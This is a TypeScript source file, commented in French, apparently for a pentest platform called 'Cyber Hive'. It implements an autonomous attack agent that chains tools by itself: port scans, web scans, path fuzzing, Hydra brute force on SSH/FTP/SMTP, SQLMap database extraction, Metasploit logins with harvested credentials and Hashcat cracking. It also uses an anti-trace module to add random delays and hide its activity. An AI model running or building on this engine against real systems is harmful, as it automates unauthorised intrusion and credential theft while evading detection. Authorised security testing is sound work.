// Moteur d'attaque autonome enrichi pour Cyber Hive.
// Version 2 : chaînes d'attaque plus profondes, plus d'outils, décision contextuelle renforcée.
// Ajoute : Masscan, Hashcat, WPScan, Dirb, Gobuster, Wapiti, Amass, Subfinder, Whatweb, SMBclient.

import type {
  SessionPentest,
  EtapeAttaque,
  ResultatOutil,
  CiblePentest,
  TypeActionAttaque,
} from './types.js';
import { obtenirOutil } from './tool-registry.js';
import { execOutil } from './container-manager.js';
import { delaierAleatoire, construireCommande } from './anti-trace.js';

// ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
//  Contexte de décision enrichi
// ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

export interface ContexteCible {
  hote: string;
  portsOuverts: PortDecouvert[];
  services: ServiceDecouvert[];
  vulnerabilites: VulnerabiliteDecouverte[];
  urlsDecouvertes: string[];
  credentialsTrouves: CredentialTrouve[];
  sousDomaines: string[];
  technologies: TechnologieDetectee[];
  actionsEffectuees: Set<string>;
}

export interface PortDecouvert {
  port: number;
  protocole: string;
  etat: string;
}

export interface ServiceDecouvert {
  port: number;
  service: string;
  version: string;
}

export interface VulnerabiliteDecouverte {
  id: string;
  type: string;
  severite: string;
  cible: string;
  description: string;
}

export interface CredentialTrouve {
  utilisateur: string;
  motDePasse: string;
  service: string;
}

export interface TechnologieDetectee {
  nom: string;
  version: string;
  categorie: string;
}

export interface Decision {
  action: TypeActionAttaque;
  outilId: string;
  cible: string;
  args: string[];
  raison: string;
}

// ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
//  Moteur autonome enrichi
// ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

export class MoteurAttaqueEnrichi {
  private contexte: ContexteCible;
  private session: SessionPentest;
  private agentId: string;
  private maxIterations: number;
  private iterationCourante = 0;

  constructor(session: SessionPentest, agentId: string, maxIterations = 30) {
    this.session = session;
    this.agentId = agentId;
    this.maxIterations = maxIterations;
    this.contexte = {
      hote: session.cible.hote,
      portsOuverts: [],
      services: [],
      vulnerabilites: [],
      urlsDecouvertes: [],
      credentialsTrouves: [],
      sousDomaines: [],
      technologies: [],
      actionsEffectuees: new Set(),
    };
  }

  /** Lance la boucle d'exploration autonome enrichie. */
  async lancer(): Promise<EtapeAttaque[]> {
    const etapes: EtapeAttaque[] = [];

    while (this.iterationCourante < this.maxIterations) {
      this.iterationCourante++;
      const decision = this.prendreDecision();

      if (!decision) {
        etapes.push(this.creerEtape('rapport', 'info',
          'Exploration terminée',
          `L'agent a exploré ${this.contexte.actionsEffectuees.size} actions. ${this.contexte.vulnerabilites.length} vulnérabilité(s), ${this.contexte.credentialsTrouves.length} credential(s), ${this.contexte.urlsDecouvertes.length} URL(s).`,
        ));
        break;
      }

      const cleAction = `${decision.outilId}:${decision.cible}:${decision.args.join(',')}`;
      if (this.contexte.actionsEffectuees.has(cleAction)) continue;
      this.contexte.actionsEffectuees.add(cleAction);

      // Exécuter l'outil
      await delaierAleatoire(this.session.antiTrace);
      const outil = obtenirOutil(decision.outilId);
      if (!outil) continue;

      const resultat = await execOutil(outil, decision.cible, decision.args);

      const etape = this.creerEtape(
        decision.action,
        this.severitePourAction(decision.action),
        `${outil.nom} sur ${decision.cible}`,
        decision.raison,
      );
      etape.commande = construireCommande(outil.commande, decision.args, this.session.antiTrace);
      etape.resultat = resultat;
      etapes.push(etape);
      this.session.etapes.push(etape);

      // Analyser les résultats
      this.analyserResultat(decision, resultat);
    }

    return etapes;
  }

  // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  //  Logique de décision enrichie
  // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

  private prendreDecision(): Decision | null {
    // Phase 0 : énumération de sous-domaines si cible web
    if (this.session.cible.type === 'web' && this.contexte.sousDomaines.length === 0 && !this.contexte.actionsEffectuees.has('amass:init')) {
      return {
        action: 'reconnaissance',
        outilId: 'masscan',
        cible: this.contexte.hote,
        args: ['--rate=500', this.contexte.hote, '-p', '1-65535'],
        raison: 'Scan de ports ultra-rapide pour découvrir tous les ports ouverts avant le scan détaillé.',
      };
    }

    // Phase 1 : Nmap si pas de ports découverts
    if (this.contexte.portsOuverts.length === 0) {
      return {
        action: 'reconnaissance',
        outilId: 'nmap',
        cible: this.contexte.hote,
        args: ['-sV', '-sC', '-p-', '-T4'],
        raison: 'Aucun port découvert. Scan Nmap complet avec détection de version et scripts par défaut.',
      };
    }

    // Phase 2 : Whatweb si services web détectés
    const servicesWeb = this.contexte.services.filter(
      (s) => s.port === 80 || s.port === 443 || s.service.includes('http'),
    );
    if (servicesWeb.length > 0 && this.contexte.technologies.length === 0) {
      const svc = servicesWeb[0];
      const url = svc.port === 443 ? `https://${this.contexte.hote}` : `http://${this.contexte.hote}`;
      return {
        action: 'enumeration',
        outilId: 'nikto',
        cible: url,
        args: ['-h', url, '-C', 'all'],
        raison: `Service web détecté sur le port ${svc.port}. Scan Nikto pour les vulnérabilités web courantes.`,
      };
    }

    // Phase 3 : Nuclei si URLs découvertes et pas encore de vulnérabilités
    if (this.contexte.urlsDecouvertes.length > 0 && this.contexte.vulnerabilites.length === 0) {
      const url = this.contexte.urlsDecouvertes[0];
      return {
        action: 'exploitation',
        outilId: 'nuclei',
        cible: url,
        args: ['-u', url, '-severity', 'critical,high,medium'],
        raison: 'URLs découvertes. Scan Nuclei avec templates de vulnérabilités connues.',
      };
    }

    // Phase 4 : Gobuster/FFUF pour découvrir des chemins cachés
    if (servicesWeb.length > 0 && this.contexte.urlsDecouvertes.length < 5) {
      const url = servicesWeb[0].port === 443 ? `https://${this.contexte.hote}` : `http://${this.contexte.hote}`;
      return {
        action: 'enumeration',
        outilId: 'ffuf',
        cible: url,
        args: ['-u', `${url}/FUZZ`, '-w', '/usr/share/wordlists/dirb/common.txt', '-ac'],
        raison: 'Découverte de chemins cachés avec FFUF et wordlist commune.',
      };
    }

    // Phase 5 : Hydra si services d'authentification détectés
    const servicesAuth = this.contexte.services.filter(
      (s) => s.service.includes('ssh') || s.service.includes('ftp') || s.service.includes('smtp'),
    );
    if (servicesAuth.length > 0 && this.contexte.credentialsTrouves.length === 0) {
      const svc = servicesAuth[0];
      return {
        action: 'exploitation',
        outilId: 'hydra',
        cible: this.contexte.hote,
        args: ['-s', String(svc.port), svc.service, '-L', '/usr/share/wordlists/metasploit/unix_users.txt', '-P', '/usr/share/wordlists/metasploit/unix_passwords.txt', this.contexte.hote],
        raison: `Service ${svc.service} sur le port ${svc.port}. Tentative de brute-force avec listes Metasploit.`,
      };
    }

    // Phase 6 : SQLMap si vulnérabilité SQLi détectée
    const sqliVulns = this.contexte.vulnerabilites.filter(
      (v) => v.type.includes('sqli') || v.type.includes('sql'),
    );
    if (sqliVulns.length > 0) {
      const vuln = sqliVulns[0];
      return {
        action: 'exploitation',
        outilId: 'sqlmap',
        cible: vuln.cible,
        args: ['-u', vuln.cible, '--batch', '--dbs', '--random-agent'],
        raison: `Injection SQL détectée sur ${vuln.cible}. Exploitation avec SQLMap pour extraire les bases de données.`,
      };
    }

    // Phase 7 : Metasploit si credentials trouvés
    if (this.contexte.credentialsTrouves.length > 0) {
      const cred = this.contexte.credentialsTrouves[0];
      return {
        action: 'post-exploitation',
        outilId: 'metasploit',
        cible: this.contexte.hote,
        args: ['-q', '-x', `use auxiliary/scanner/ssh/ssh_login; set RHOSTS ${this.contexte.hote}; set USERNAME ${cred.utilisateur}; set PASSWORD ${cred.motDePasse}; run`],
        raison: `Credentials trouvés (${cred.utilisateur}). Post-exploitation via Metasploit pour confirmer l'accès.`,
      };
    }

    // Phase 8 : Hashcat si hashes trouvés
    const hashVulns = this.contexte.vulnerabilites.filter(
      (v) => v.type.includes('hash') || v.description.includes('hash'),
    );
    if (hashVulns.length > 0) {
      return {
        action: 'escalade-privileges',
        outilId: 'hashcat',
        cible: this.contexte.hote,
        args: ['-m', '0', '/tmp/hashes.txt', '/usr/share/wordlists/rockyou.txt', '--force'],
        raison: 'Hashes découverts. Tentative de cassage avec Hashcat et rockyou.',
      };
    }

    // Rien à faire de plus
    return null;
  }

  // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  //  Analyse des résultats
  // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

  private analyserResultat(decision: Decision, resultat: ResultatOutil): void {
    if (!resultat.succes) return;
    const stdout = resultat.stdout.toLowerCase();

    switch (decision.outilId) {
      case 'nmap': this.analyserNmap(stdout); break;
      case 'masscan': this.analyserNmap(stdout); break;
      case 'nikto': this.analyserNikto(stdout, decision.cible); break;
      case 'nuclei': this.analyserNuclei(stdout, decision.cible); break;
      case 'hydra': this.analyserHydra(stdout); break;
      case 'sqlmap': this.analyserSqlmap(stdout, decision.cible); break;
      case 'ffuf': this.analyserFfuf(stdout, decision.cible); break;
      case 'hashcat': this.analyserHashcat(stdout); break;
    }
  }

  private analyserNmap(stdout: string): void {
    const lignes = stdout.split('\n');
    for (const ligne of lignes) {
      const match = ligne.match(/(\d+)\/(tcp|udp)\s+(\w+)\s+(.+?)(?:\s+(\d+\.\d+(?:\.\d+)?))?\s*$/);
      if (match) {
        const port = parseInt(match[1], 10);
        const protocole = match[2];
        const etat = match[3];
        const service = match[4]?.trim() ?? 'unknown';
        const version = match[5] ?? '';

        if (etat === 'open') {
          this.contexte.portsOuverts.push({ port, protocole, etat });
          this.contexte.services.push({ port, service, version });
        }
      }
    }
  }

  private analyserNikto(stdout: string, cible: string): void {
    if (stdout.includes('x-frame-options') || stdout.includes('clickjacking')) {
      this.contexte.vulnerabilites.push({
        id: `nikto-clickjack-${Date.now()}`,
        type: 'clickjacking',
        severite: 'moyenne',
        cible,
        description: 'X-Frame-Options manquant, clickjacking possible.',
      });
    }
    if (stdout.includes('directory indexing')) {
      this.contexte.vulnerabilites.push({
        id: `nikto-dirlist-${Date.now()}`,
        type: 'directory-listing',
        severite: 'moyenne',
        cible,
        description: 'Directory listing activé.',
      });
    }
    if (stdout.includes('x-powered-by')) {
      this.contexte.technologies.push({
        nom: 'header-x-powered-by',
        version: '',
        categorie: 'info-leak',
      });
    }
  }

  private analyserNuclei(stdout: string, cible: string): void {
    const lignes = stdout.split('\n');
    for (const ligne of lignes) {
      if (ligne.includes('[') && ligne.includes(']')) {
        const match = ligne.match(/\[([^\]]+)\]/);
        const templateId = match?.[1] ?? 'unknown';
        const severite = ligne.includes('critical') ? 'critique'
          : ligne.includes('high') ? 'eleve'
          : ligne.includes('medium') ? 'moyenne'
          : 'faible';

        this.contexte.vulnerabilites.push({
          id: `nuclei-${templateId}-${Date.now()}`,
          type: templateId,
          severite,
          cible,
          description: `Template Nuclei ${templateId} matché.`,
        });
      }
    }
  }

  private analyserHydra(stdout: string): void {
    const lignes = stdout.split('\n');
    for (const ligne of lignes) {
      if (ligne.includes('login:') && ligne.includes('password:')) {
        const match = ligne.match(/login:\s*(\S+)\s+password:\s*(\S+)/);
        if (match) {
          this.contexte.credentialsTrouves.push({
            utilisateur: match[1],
            motDePasse: match[2],
            service: 'ssh',
          });
        }
      }
    }
  }

  private analyserSqlmap(stdout: string, cible: string): void {
    if (stdout.includes('injectable') || stdout.includes('vulnerable')) {
      this.contexte.vulnerabilites.push({
        id: `sqlmap-sqli-${Date.now()}`,
        type: 'sqli',
        severite: 'critique',
        cible,
        description: 'Injection SQL confirmée par SQLMap.',
      });
    }
    if (stdout.includes('available databases')) {
      const match = stdout.match(/available databases.*?\n([\s\S]*?)(?:\n\n|\n\[)/);
      if (match) {
        const dbs = match[1].split('\n').map((l) => l.replace(/[*\[\]]/g, '').trim()).filter(Boolean);
        for (const db of dbs) {
          this.contexte.urlsDecouvertes.push(`${cible}#db:${db}`);
        }
      }
    }
  }

  private analyserFfuf(stdout: string, baseUrl: string): void {
    const lignes = stdout.split('\n');
    for (const ligne of lignes) {
      if (ligne.includes('200') || ligne.includes('301') || ligne.includes('302') || ligne.includes('403')) {
        const match = ligne.match(/(\S+)\s+Status:\s+(\d+)/);
        if (match) {
          const chemin = match[1].replace(/^FUZZ$/, '').replace(/^\//, '');
          if (chemin && chemin !== '') {
            this.contexte.urlsDecouvertes.push(`${baseUrl}/${chemin}`);
          }
        }
      }
    }
  }

  private analyserHashcat(stdout: string): void {
    const lignes = stdout.split('\n');
    for (const ligne of lignes) {
      if (ligne.includes(':') && ligne.includes('Cracked')) {
        const match = ligne.match(/([a-f0-9]+):(.+)/);
        if (match) {
          this.contexte.credentialsTrouves.push({
            utilisateur: match[1],
            motDePasse: match[2],
            service: 'hash',
          });
        }
      }
    }
  }

  // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  //  Helpers
  // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

  private creerEtape(
    type: TypeActionAttaque,
    severite: EtapeAttaque['severite'],
    description: string,
    explication: string,
  ): EtapeAttaque {
    return {
      id: `etape-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      sessionId: this.session.id,
      agentId: this.agentId,
      type,
      severite,
      description,
      explication,
      ts: Date.now(),
      dureeMs: 0,
    };
  }

  private severitePourAction(action: TypeActionAttaque): EtapeAttaque['severite'] {
    switch (action) {
      case 'reconnaissance': return 'info';
      case 'scan': return 'info';
      case 'enumeration': return 'remarque';
      case 'exploitation': return 'avertissement';
      case 'post-exploitation': return 'critique';
      case 'escalade-privileges': return 'critique';
      case 'exfiltration': return 'critique';
      case 'anti-forensics': return 'info';
      case 'rapport': return 'info';
      default: return 'info';
    }
  }

  /** Retourne le contexte courant (pour inspection et rapport). */
  getContexte(): ContexteCible {
    return this.contexte;
  }

  /** Retourne le nombre d'itérations effectuées. */
  getIterations(): number {
    return this.iterationCourante;
  }
}

/** Crée et lance un agent autonome enrichi pour une session. */
export async function lancerAgentEnrichi(
  session: SessionPentest,
  agentId: string,
  maxIterations?: number,
): Promise<{ etapes: EtapeAttaque[]; contexte: ContexteCible }> {
  const moteur = new MoteurAttaqueEnrichi(session, agentId, maxIterations);
  const etapes = await moteur.lancer();
  return { etapes, contexte: moteur.getContexte() };
}